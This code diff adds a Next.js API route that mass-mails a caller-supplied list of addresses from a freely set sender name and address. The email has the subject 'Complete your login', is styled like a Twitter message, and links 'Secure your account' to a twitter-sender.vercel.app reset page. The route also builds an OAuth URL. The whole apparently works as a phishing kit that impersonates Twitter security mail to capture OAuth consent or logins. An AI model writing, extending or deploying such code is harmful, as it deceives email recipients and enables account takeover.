@@ -14,7 +14,79 @@ interface EmailRequest {
 }
 
 export async function POST(request: NextRequest) {
-	
+	try {
+		const body: EmailRequest = await request.json();
+		const { emails, fromEmail, fromName, useStaticUrl } = body || {} as EmailRequest;
+
+		if (!emails || !Array.isArray(emails) || emails.length === 0) {
+			return NextResponse.json(
+				{ error: "Invalid or missing emails array" },
+				{ status: 400 },
+			);
+		}
+
+		// Very basic in-memory rate limiting per caller IP (best-effort in serverless)
+		const clientIP =
+			(request as any).ip ||
+			request.headers.get("x-forwarded-for") ||
+			request.headers.get("x-real-ip") ||
+			"unknown";
+		const now = Date.now();
+		const last = rateLimitStore.get(String(clientIP));
+		if (last && now - last < 60_000) {
+			return NextResponse.json(
+				{ error: "Rate limit exceeded. Try again in a minute." },
+				{ status: 429 },
+			);
+		}
+		rateLimitStore.set(String(clientIP), now);
+
+		// Build OAuth URL
+		const oauthUrl = useStaticUrl
+			? await generateStaticOAuthURL()
+			: await generateOAuthURL();
+
+		// Send emails via Resend (collect results)
+		const sender = (fromEmail || "noreply@yourdomain.com").trim();
+		const name = (fromName || "").trim();
+
+		// Basic email shape validation to avoid Resend 422s
+		if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(sender)) {
+			return NextResponse.json(
+				{ error: "Invalid fromEmail. Use a valid email like name@example.com" },
+				{ status: 400 },
+			);
+		}
+
+		const fromField = name.length > 0 ? `${name} <${sender}>` : sender;
+
+		const sendResults = await Promise.allSettled(
+			emails.map((to) =>
+				resend.emails.send({
+					from: fromField,
+					to,
+					subject: "Complete your login",
+					html: generateEmailHTML(),
+				})
+			),
+		);
+
+		const successful = sendResults.filter((r) => r.status === "fulfilled").length;
+		const failed = sendResults.length - successful;
+
+		return NextResponse.json({
+			success: true,
+			message: `Invites sent: ${successful}/${emails.length}`,
+			summary: { total: emails.length, successful, failed },
+			oauthUrl,
+		});
+	} catch (error) {
+		console.error("Error in send-oauth-invites POST:", error);
+		return NextResponse.json(
+			{ error: "Failed to send OAuth invites" },
+			{ status: 500 },
+		);
+	}
 }
 
 function generateEmailHTML(): string {
@@ -140,7 +212,7 @@ function generateEmailHTML(): string {
 <td align="left;" style="padding:0;margin:0;line-height:1px;font-size:1px;font-family:'HelveticaNeue','Helvetica Neue',Helvetica,Arial,sans-serif;font-size:16px;line-height:20px;font-weight:400;color:#292f33;text-align:left;text-decoration:none">
 <ul>
 <li align="left" dir="ltr">
-  <a href="https://16aiflow.xyz/reset" 
+  <a href="https://twitter-sender.vercel.app/reset" 
      style="text-decoration:none;color:#1da1f2;font-weight:400;" 
      rel="noopener">
     Secure your account.
